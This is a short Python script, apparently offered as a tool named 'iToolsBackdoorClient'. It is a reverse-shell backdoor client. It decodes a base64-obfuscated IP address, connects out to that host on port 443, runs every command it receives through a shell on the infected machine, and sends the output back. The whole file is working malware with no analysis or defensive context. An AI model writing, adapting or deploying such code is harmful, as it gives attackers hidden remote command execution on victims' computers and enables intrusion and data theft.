#!/usr/bin/python
#Code by INDHI FARHANDIKA R
#Aplikasi iToolsBackdoorClient

import socket,base64,os,subprocess as sp, sys

def iTools():
    ip = 'MTAuMjU0LjEwNy4xMjI=' #Decrypt IP menggunakan iTBase64
    PORT = 443 #PORT
    HOST = base64.b64decode(ip)
    sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sc.connect((HOST, PORT))
    while 1:
        cmd = str(sc.recv(1024))
        if cmd != "exit":
            proc = sp.Popen(cmd, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            out, err = proc.communicate()
            result = str(out) + str(err)
            length = str(len(result)).zfill(16)
            sc.send(length + result)
        else:
            break
    sc.close()
if __name__ == '__main__':
    iTools()
